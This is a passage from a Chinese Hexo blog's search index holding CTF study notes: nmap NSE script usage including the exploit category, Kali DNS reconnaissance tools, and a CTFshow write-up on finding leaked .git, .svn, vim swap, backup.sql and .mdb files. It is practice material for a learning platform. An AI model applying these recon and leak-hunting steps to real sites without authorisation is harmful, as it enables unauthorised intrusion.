目标</code>（使用nmap中漏洞分类脚本对目标进行探测）</li><li><code>nmap -sV --script=&quot;version, discovery&quot; 目标</code>（使用nmap中发现和版本信息分类进行探测）</li><li><code>nmap -sV --script=&quot;not exploit&quot; 目标</code>（使用nmap中除了exploit分类之外的其他分类进行探测）</li></ul></li><li><p><strong>NSE调试功能使用</strong></p><ul><li><code>nmap -sV --script exploit -d 3 --script-trace 目标</code>（使用nmap中的expolit，但是同时开启调试模式）<ul><li>-d(debug范围0～9)</li></ul></li></ul></li><li><p><code>nmap -sV --script http-title --script-args http.useragent=&quot;Mozilla 999&quot; 目标</code>（使用nmap的http-title脚本，并且指定使用的User-Agent）</p></li><li><p><strong>NSE更新</strong><code>nmap -script-updatedb</code></p></li><li><p><strong>NSE脚本分类</strong> <a href="https://nmap.org/nsedoc/">https://nmap.org/nsedoc/</a></p></li></ul><h3 id="使用特定网卡进行探测"><a href="#使用特定网卡进行探测" class="headerlink" title="使用特定网卡进行探测"></a>使用特定网卡进行探测</h3><ul><li><code>nmap -e 网卡(interface) 目标</code></li></ul><h3 id="对比探测结果"><a href="#对比探测结果" class="headerlink" title="对比探测结果"></a>对比探测结果</h3><ul><li>利用ndiff工具</li><li><code>ndiff file1 file2</code></li><li>例子：<code>ndiff kali.xml kali2.xml</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_SSRF</title>
    <link href="/2022/07/26/CTF_show_Web%E5%85%A5%E9%97%A8_SSRF/"/>
    <url>/2022/07/26/CTF_show_Web%E5%85%A5%E9%97%A8_SSRF/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_SSRF.html">http://118.178.126.49/blogs/CTF_show_Web入门_SSRF.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_XSS</title>
    <link href="/2022/07/24/CTF_show_Web%E5%85%A5%E9%97%A8_XSS/"/>
    <url>/2022/07/24/CTF_show_Web%E5%85%A5%E9%97%A8_XSS/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_XSS.html">http://118.178.126.49/blogs/CTF_show_Web入门_XSS.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_sql注入</title>
    <link href="/2022/07/21/CTF_show_Web%E5%85%A5%E9%97%A8_sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/07/21/CTF_show_Web%E5%85%A5%E9%97%A8_sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_sql%E6%B3%A8%E5%85%A5.html">http://118.178.126.49/blogs/CTF_show_Web入门_sql注入.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_php特性</title>
    <link href="/2022/07/16/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7/"/>
    <url>/2022/07/16/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7.html">http://118.178.126.49/blogs/CTF_show_Web入门_php特性.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_文件包含</title>
    <link href="/2022/07/13/CTF_show_Web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2022/07/13/CTF_show_Web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html">http://118.178.126.49/blogs/CTF_show_Web入门_文件包含.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_命令执行</title>
    <link href="/2022/07/12/CTF_show_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2022/07/12/CTF_show_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html">http://118.178.126.49/blogs/CTF_show_Web入门_命令执行.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kali_信息搜集</title>
    <link href="/2022/07/12/kali_%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2022/07/12/kali_%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Kali-信息搜集"><a href="#Kali-信息搜集" class="headerlink" title="Kali_信息搜集"></a>Kali_信息搜集</h1><h2 id="DNS分析收集分析"><a href="#DNS分析收集分析" class="headerlink" title="DNS分析收集分析"></a>DNS分析收集分析</h2><h3 id="dnsmap"><a href="#dnsmap" class="headerlink" title="dnsmap"></a>dnsmap</h3><ul><li>dnsmap qq.com options<ul><li>-w <wordlist-file></wordlist-file></li><li>-r <regular-results-file></regular-results-file></li><li>-c <csv-results-file></csv-results-file></li><li>-d <delay-millisecs></delay-millisecs></li><li>-i <ips-to-ignore> （ips就是忽略防御系统）</ips-to-ignore></li></ul></li></ul><h3 id="dnsrecon"><a href="#dnsrecon" class="headerlink" title="dnsrecon"></a>dnsrecon</h3><ul><li><p>Options:</p><ul><li><p>-h help</p></li><li><p>-d –domain <domain>              Domain to Target for enumeration</domain></p></li><li><p>-r –range <range>                    IP range for reverse look-up brute force in formats (first-last) or in (range&#x2F;bitmask) 反省解析爆破的IP范围</range></p></li><li><p>-n –name_server <name>          不提供任何SOA信息（DNS记录类型）时进行的DNS服务器的使用</name></p></li><li><p>-D –dictionary <file></file></p></li><li><p>-f                                                  过滤输出</p></li><li><p>-t -type  <types>                        </types></p><div class="code-wrapper"><pre><code class="hljs elm">types:&#123;std 标准模式，rvl 对指定的<span class="hljs-type">CIDR</span> <span class="hljs-type">IP</span>范围反查，brt 使用域名和主机的字典文件，srv 列出srv记录，goo 使用谷歌，snoop 会对一个域名的所有<span class="hljs-type">NS</span>服务器执行缓存嗅探和-<span class="hljs-type">D</span>一起使用，tld 移除所指域名的<span class="hljs-type">TLD</span>信息测试所有的<span class="hljs-type">TLD</span>(顶级域名)注册在<span class="hljs-type">IANA</span>，-a 标准枚举下执行<span class="hljs-type">AXFR</span>，-s 执行反向<span class="hljs-type">SPF</span>记录查询，对于ipv4地址范围-g 使用谷歌-w 查询<span class="hljs-type">WHOIS</span>和<span class="hljs-type">IP</span>的反向解析-z 执行<span class="hljs-type">DNSSEC</span> <span class="hljs-type">Zone</span> <span class="hljs-type">Walk</span><span class="hljs-comment">--threads </span><span class="hljs-comment">--lifetime</span>保存什么类型文件<span class="hljs-comment">--db</span><span class="hljs-comment">--xml</span><span class="hljs-comment">--iw</span>-c,<span class="hljs-comment">--csv</span>-j,<span class="hljs-comment">--json</span>&#125;</code></pre></div></li></ul></li></ul><h3 id="fierce"><a href="#fierce" class="headerlink" title="fierce"></a>fierce</h3><ul><li><p>作用：查找目标的IP和主机名，进行子域名爆破</p></li><li><p>特点：可以设置多个不连续的IP地址，可以多线程惊喜</p></li><li><p>参数</p><div class="code-wrapper"><pre><code class="hljs diff"><span class="hljs-deletion">-delay 不按照指定次数</span><span class="hljs-deletion">-dns 指定一个域名</span><span class="hljs-deletion">-dnsfile 反查时候使用的字典</span><span class="hljs-deletion">-dnsserver 使用特定的DNS服务器</span><span class="hljs-deletion">-file A file you would like to output to be logged to</span><span class="hljs-deletion">-fulloutput 输出webserver返回的信息，但是要和-connect连用</span><span class="hljs-deletion">-help</span><span class="hljs-deletion">-nopattern 不按照搜索模式查找邻近的主机</span><span class="hljs-deletion">-range 指定ip范围</span><span class="hljs-deletion">-search 不详</span><span class="hljs-deletion">-supress </span><span class="hljs-deletion">-tcptimeout 指定超时时间</span><span class="hljs-deletion">-threads 指定线程</span></code></pre></div></li></ul><h3 id="lbd（load-balance-detector）"><a href="#lbd（load-balance-detector）" class="headerlink" title="lbd（load balance detector）"></a>lbd（load balance detector）</h3>]]></content>
    
    
    <categories>
      
      <category>kali</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_爆破</title>
    <link href="/2022/07/11/CTF_show_Web%E5%85%A5%E9%97%A8_%E7%88%86%E7%A0%B4/"/>
    <url>/2022/07/11/CTF_show_Web%E5%85%A5%E9%97%A8_%E7%88%86%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_%E7%88%86%E7%A0%B4.html">http://118.178.126.49/blogs/CTF_show_Web入门_爆破.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_信息搜集</title>
    <link href="/2022/07/10/CTF-show-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2022/07/10/CTF-show-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr><h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><ul><li>查看源代码直接找到</li></ul><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><ul><li>火狐浏览器网址上输入config：about后打开设置禁止js（绕过js前端验证）</li><li>查看源码</li></ul><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><ul><li>bp抓包</li><li>把GET改成POST</li><li>Repeat了一下就出来flag了</li></ul><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><ul><li>根据提示看一下robots协议</li><li>看到flagishere.txt访问一下</li><li>出flag</li></ul><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><ul><li>访问index.phps后下载文件打开即得flag</li></ul><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><ul><li>使用diesearch扫出<a href="http://www.zip/">www.zip</a></li><li>访问下载得到flag</li></ul><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><ul><li>提示：版本控制很重要</li><li>联想：用什么控制版本？git！</li><li>访问 <em><strong>.git&#x2F;</strong></em> 得flag</li></ul><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><ul><li>提示：版本控制很重要（怎么又是这个？）</li><li>联想：除了git还有什么可以控制版本？svn!</li><li>访问 ***.svn&#x2F;***得flag</li></ul><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><ul><li>提示：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</li><li>联想：vim死机？这不留下vim缓存<ul><li><strong>知识点</strong>：vim 交换文件名<br>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容<br>以 index.php 为例：第一次产生的交换文件名为 .index.php.swp<br>再次意外退出后，将会产生名为 .index.php.swo 的交换文件<br>第三次产生的交换文件则为 .index.php.swn</li></ul></li><li>此题访问.index.php.swp下载打开得flag</li></ul><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><ul><li>看cookie</li></ul><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><ul><li><a href="https://zijian.aliyun.com上查一下flag.ctfshow.com/">https://zijian.aliyun.com上查一下flag.ctfshow.com</a></li></ul><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><ul><li>提示：有时候网站上的公开信息，就是管理员常用密码</li><li>打开网址（太酷炫，按了5min啥结果没有）</li><li>思考：在哪登陆？试一下login没有 再思考 试一下admin发现找到登陆口</li><li>思考：密码在哪？</li><li>思考提示：最下面找到个数字尝试一下，flag！</li></ul><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><ul><li><p>提示：技术文档中不要出现敏感信息，部署到生产环境后及时修改默认密码</p></li><li><p>打开链接，开始闲逛，翻到最底下，技术文档，技术文档，技术文档。。。document？！点开</p></li><li><p>easy</p></li><li><p>点了一下链接，进不去？？？！</p></li><li><p><img src="https://img-blog.csdnimg.cn/8983f88e7e264e92bd52ba5ad94c45e5.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>再看看链接。。。 <strong>your-domain</strong></p></li><li><p>学过英语 dddd</p></li><li><p>拿下</p></li></ul><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><ul><li><p>提示：有时候源码里面就不经意间泄漏重要信息（editor）的信息，默认配置害死人</p></li><li><p>dirsearch一下发现&#x2F;editor</p></li><li><p>果断访问一下</p></li><li><p><img src="https://img-blog.csdnimg.cn/42ede35c3e304845887c7801a102507f.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>懵逼1s</p></li><li><p>点提交404（cao，怎么是404）。。。再想想</p></li><li><p>上传图片打开</p></li><li><p><img src="https://img-blog.csdnimg.cn/875fc3b0c3104b95bcafc5c20d718436.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>感觉没什么用啊，崩溃ing</p></li><li><p>随便点一下<strong>图片空间</strong> 哎嗨</p></li><li><p><img src="https://img-blog.csdnimg.cn/57a646bf776f4c17a3af3cd2052aa94f.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>这不就是linux服务器的文件形式吗？想起提示<strong>默认地址</strong></p></li><li><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;nothinghere&#x2F;fl000g.txt</p></li><li><p>找到地址访问得flag！！！</p></li></ul><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><ul><li>提示：公开的信息比如邮箱，可能造成信息泄漏，产生严重后果</li><li>打开网页在下面找到一个qq邮箱</li><li>试一下访问&#x2F;admin</li><li>需要密码</li><li>忘记密码</li><li>提示需要问答验证（需要地址）</li><li>qq搜索改qq号发现地址为西安</li><li>输入后重置密码登录获取flag</li></ul><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><ul><li><p>看了别人的WP</p></li><li><p><strong>知识点</strong>（查阅可知）：php探针：用来检测空间、服务器运行状况和PHP信息等</p></li><li><p>&#x2F;tz.php访问雅黑PHP探针</p></li><li><p>点击phpinfo</p></li><li><p>ctrl+F搜索ctfshow找到flag</p></li><li><p>长见识了捏</p></li></ul><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><ul><li>提示：备份的sql文件会泄漏敏感信息</li><li>dirsearch搜了一遍找不到</li><li>看了wp</li><li>原来是backup.sql</li><li>长点见识</li></ul><h3 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h3><ul><li><p>打开链接：小鸟游戏（🤯好难，101这是人能到的分数？）</p></li><li><p>估摸是js写的小游戏</p></li><li><p>查看源代码</p></li><li><p><img src="https://img-blog.csdnimg.cn/abb13751e7084b9890488709af0d6c66.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>score&gt;100?嗯？这不是我心心念念的101吗</p></li><li><p><img src="https://img-blog.csdnimg.cn/b1109420a39e443db3a875347249d708.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>编码一下</p></li><li><p>访问110.php</p></li><li><p>flag</p></li></ul><h3 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h3><ul><li>查看源代码js部分看到username和pazzword</li><li>我这里直接输入框里输过不去</li><li>抓了个包</li><li>得到flag</li></ul><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><ul><li>提示：mdb文件是早期asp+access架构的数据库文件，文件泄漏相当于数据库被脱裤了</li><li>盲区 看wp</li><li>访问&#x2F;db&#x2F;db.mdb</li><li>下载文件记事本打开得flag</li></ul>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/07/10/hello-world/"/>
    <url>/2022/07/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span></code></pre></div><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo server</code></pre></div><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo generate</code></pre></div><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo deploy</code></pre></div><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
